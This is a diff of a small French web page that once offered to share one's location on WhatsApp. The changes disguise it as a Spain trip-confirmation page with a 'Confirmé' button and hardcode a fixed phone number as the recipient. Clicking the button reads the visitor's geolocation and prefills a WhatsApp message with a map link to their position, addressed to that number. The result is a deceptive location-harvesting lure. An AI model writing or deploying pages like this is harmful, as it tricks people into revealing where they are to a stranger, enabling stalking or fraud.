@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Partager la position sur WhatsApp</title>
+    <title>Confirmation de votre voyage en Espagne</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -51,12 +51,12 @@
 <body>
 
 <div class="container">
-    <h1>Envoyer votre localisation sur WhatsApp</h1>
-    <p id="instruction">Cliquez sur le bouton pour partager votre localisation.</p>
+    <h1>Confirmation de votre voyage en Espagne</h1>
+    <p id="instruction">Cliquez sur le bouton pour confirmer votre voyage.</p>
 
     <div id="locationMessage">Voyage en Espagne 🇪🇸 ! Voici ma position actuelle : <span id="mapLink"></span></div>
 
-    <button id="sendLocationButton">Partager la position sur WhatsApp</button>
+    <button id="sendLocationButton">Confirmé</button>
 </div>
 
 <script>
@@ -109,7 +109,7 @@
             const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
             const message = `Voyage en Espagne 🇪🇸 ! Voici ma position actuelle : ${locationUrl}\n\nConfirmez votre voyage avec nous!`;
 
-            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
+            const whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
             window.open(whatsappUrl, '_blank');
         } else {
             alert("Veuillez activer la géolocalisation pour partager votre position.");
